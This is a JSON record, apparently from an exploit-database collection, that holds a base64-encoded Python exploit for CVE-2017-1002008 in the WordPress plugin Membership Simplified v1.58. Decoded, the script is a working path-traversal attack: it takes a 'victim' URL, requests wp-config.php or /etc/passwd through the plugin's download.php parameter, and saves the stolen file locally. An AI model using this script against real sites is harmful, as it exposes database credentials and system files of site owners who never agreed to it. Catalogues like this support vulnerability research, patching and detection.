{
    "source": "exploit-database", 
    "exploit": "aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgc3RyaW5nDQppbXBvcnQgcmFuZG9tDQpmcm9tIHVybHBhcnNlIGltcG9ydCB1cmxwYXJzZQ0KDQpwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIg0KcHJpbnQgIldvcmRwcmVzcyBQbHVnaW4gTWVtYmVyc2hpcCBTaW1wbGlmaWVkIHYxLjU4IC0gQXJiaXRyYXJ5IEZpbGUgRG93bmxvYWRcbkRpc2NvdmVyeTogTGFycnkgVy4gQ2FzaGRvbGxhclxuRXhwbG9pdCBBdXRob3I6IE11bmlyIE5qaXJ1XG5XZWJzaXRlOiBodHRwczovL3d3dy5hbGllbi13aXRoaW4uY29tXG5DVkUtMjAxNy0xMDAyMDA4XG5DV0U6IDIzXG5cblJlZmVyZW5jZSBVUkxzOlxuaHR0cDovL3d3dy52YXBpZGxhYnMuY29tL2Fkdmlzb3J5LnBocD92PTE4NyINCnByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iDQp2aWN0aW0gPSByYXdfaW5wdXQoIlBsZWFzZSBFbnRlciB2aWN0aW0gaG9zdCBlLmcuIGh0dHA6Ly9leGFtcGxlLmNvbTogIikNCmZpbGVfY2hvaWNlPXJhd19pbnB1dCAoIlxuIFBsZWFzZSBjaG9vc2UgYSBudW1iZXIgcmVwcmVzZW50aW5nIHRoZSBmaWxlIHRvIGF0dGFjazogXG4xLiBXb3JkcHJlc3MgQ29uZmlnIFxuMi4gTGludXggUGFzc3dkIEZpbGVcbiIpDQppZiBmaWxlX2Nob2ljZSA9PSAiMSI6DQogICAgcGF5bG9hZD0iLi4uLy4vLi4uLy4vLi4uLy4vd3AtY29uZmlnLnBocCINCmVsaWYgZmlsZV9jaG9pY2UgPT0gIjIiOg0KICAgIHBheWxvYWQ9Ii4uLi8uLy4uLi8uLy4uLi8uLy4uLi8uLy4uLi8uLy4uLi8uLy4uLi8uLy4uLi8uL2V0Yy9wYXNzd2QiDQplbHNlOg0KICAgIHByaW50ICJJbnZhbGlkIERvd25sb2FkIGNob2ljZSwgUGxlYXNlIGNob29zZSAxIG9yIDI7IEFsdGVybmF0aXZlbHkgeW91IGNhbiByZS1jb2RlIG1lIHRvSSB3aWxsIG5vdyBleGl0Ig0KICAgIHF1aXQoKSAgDQpzbHVnID0gIi93cC1jb250ZW50L3BsdWdpbnMvbWVtYmVyc2hpcC1zaW1wbGlmaWVkLWZvci1vYXAtbWVtYmVycy1vbmx5L2Rvd25sb2FkLnBocD9kb3dubG9hZF9maWxlPSIrcGF5bG9hZA0KdGFyZ2V0PXZpY3RpbStzbHVnDQpkZWYgcmFuZG9taXplRmlsZShzaXplPTYsIGNoYXJzPXN0cmluZy5hc2NpaV91cHBlcmNhc2UgKyBzdHJpbmcuZGlnaXRzKToNCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKGNoYXJzKSBmb3IgXyBpbiByYW5nZShzaXplKSkNCgkNCmRlZiBjaGVja1BsdWdpbigpOg0KICAgIHBsdWdpbkV4aXN0cyA9IHJlcXVlc3RzLmdldCh2aWN0aW0rIi93cC1jb250ZW50L3BsdWdpbnMvbWVtYmVyc2hpcC1zaW1wbGlmaWVkLWZvci1vYXAtbWVtYmVycy1vbmx5L2Rvd25sb2FkLnBocCIpDQogICAgcGx1Z2luRXhpc3RlbmNlID0gcGx1Z2luRXhpc3RzLnN0YXR1c19jb2RlDQogICAgaWYgcGx1Z2luRXhpc3RlbmNlID09IDIwMDoNCiAgICAgICAgcHJpbnQgIlxuSSBjYW4gcmVhY2ggdGhlIHRhcmdldCAmIGl0IHNlZW1zIHZ1bG5lcmFibGUsIEkgd2lsbCBhdHRlbXB0IHRoZSBleHBsb2l0XG5SdW5uaW5nIGV4cGxvaXQuLi4iDQogICAgICAgIGV4cGxvaXQoKQ0KICAgIGVsc2U6DQogICAgICAgIHByaW50ICJUYXJnZXQgaGFzIGEgZnVubnkgY29kZSAmIG1pZ2h0IG5vdCBiZSB2dWxuZXJhYmxlLCBJIHdpbGwgbm93IGV4aXRcbiINCiAgICAgICAgcXVpdCgpDQogICAgIA0KZGVmIGV4cGxvaXQoKToNCiAgICANCiAgICBnZXRUaGF0RmlsZSA9IHJlcXVlc3RzLmdldCh0YXJnZXQpDQogICAgZmlsZVN0YXRlID0gZ2V0VGhhdEZpbGUuc3RhdHVzX2NvZGUNCiAgICBicmVha0FwYXJ0PXVybHBhcnNlKHZpY3RpbSkNCiAgICBleHRyYWN0X2hvc3RuYW1lPWJyZWFrQXBhcnQubmV0bG9jCQ0KICAgIHJhbmRvbURpZmZlcmVudGlhdG9yPXJhbmRvbWl6ZUZpbGUoKQ0KICAgIGNsZWFuTmFtZT1zdHIocmFuZG9tRGlmZmVyZW50aWF0b3IpDQogICAgaWYgZmlsZVN0YXRlID09IDIwMDoNCglyZXNwRnJvbVRoYXRGaWxlID0gZ2V0VGhhdEZpbGUudGV4dA0KCWlmIGZpbGVfY2hvaWNlID09ICIxIjoNCgkJcmVzdWx0RmlsZT1leHRyYWN0X2hvc3RuYW1lKyJfY29uZmlnXyIrY2xlYW5OYW1lKyIudHh0Ig0KCQlwcmludCByZXN1bHRGaWxlDQoJCXB3bmVkPW9wZW4ocmVzdWx0RmlsZSwgJ3cnKQ0KCQlwd25lZC53cml0ZShyZXNwRnJvbVRoYXRGaWxlKQ0KCQlwd25lZC5jbG9zZQ0KCQlwcmludCAiV29yZHByZXNzIENvbmZpZyBXcml0dGVuIHRvICIrcmVzdWx0RmlsZQ0KCWVsc2U6DQoJCXJlc3VsdEZpbGU9ZXh0cmFjdF9ob3N0bmFtZSsiX3Bhc3N3ZCIrY2xlYW5OYW1lKyIudHh0Ig0KCQlwd25lZD1vcGVuKHJlc3VsdEZpbGUsICd3JykNCgkJcHduZWQud3JpdGUocmVzcEZyb21UaGF0RmlsZSkNCgkJcHduZWQuY2xvc2UNCgkJcHJpbnQgIlBhc3N3ZCBGaWxlIFdyaXR0ZW4gdG8gIityZXN1bHRGaWxlDQogICAgZWxzZTogDQoJcHJpbnQgIkkgYW0gbm90IHNheWluZyBpdCB3YXMgbWUgYnV0IGl0IHdhcyBtZSEgU29tZXRoaW5nIHdlbnQgd3Jvbmcgd2hlbiBJIHRyaWVkIHRvIGdldCB0aGUgZmlsZS4gVGhlIHNlcnZlciByZXNwb25kZWQgd2l0aDogXG4iICtmaWxlU3RhdGUNCiAgDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIGNoZWNrUGx1Z2luKCk=", 
    "filename": "platforms/php/webapps/41622.py", 
    "id": "41622", 
    "cves": [
        "CVE-2017-1002008"
    ]
}